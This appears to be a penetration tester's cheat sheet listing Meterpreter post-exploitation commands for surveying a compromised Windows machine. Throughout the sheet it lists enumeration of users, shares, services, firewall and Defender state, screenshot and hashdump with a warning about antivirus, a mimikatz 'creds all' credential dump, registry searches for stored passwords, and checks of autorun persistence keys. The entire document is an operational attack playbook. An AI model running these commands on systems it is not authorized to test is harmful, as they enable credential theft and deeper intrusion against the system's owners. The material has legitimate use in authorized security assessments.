# Meterpreter Device Survey

```
#stdapi 
#basic enumeration
sysinfo 
getuid 
ps 
netstat
apr
ipconfig
pwd
ls 
-------------------------
#carful av!!!
screenshot
hashdump 
-------------------------
shell
dir \
dir \progra~1 \progra~2
dir \users
-------------------------
net user
net localgroup 
-------------------------
net use
net view
net start 
-------------------------
reg query HKLM\Software
route print
netsh wlan show profiles 
netsh wlan show profiles
------------------------- 
netsh advfirewall show mode 
netsh advfirewall show allprofiles 
netsh advfirewall show global 
-------------------------
sc query 
sc qc WinDefend
at
schtasks
driverquery /si
-------------------------
dir \progra~1 \progra~2 /s /b | findstr /i "item1 item2 item3"
reg query HKCU /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
-------------------------
#mimikatz 
load kiwi 
creds all
-------------------------
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx"
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKLM\Software\Microsoft\powershell\<version>\powershellengine"
reg query "HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\WinSock"
```
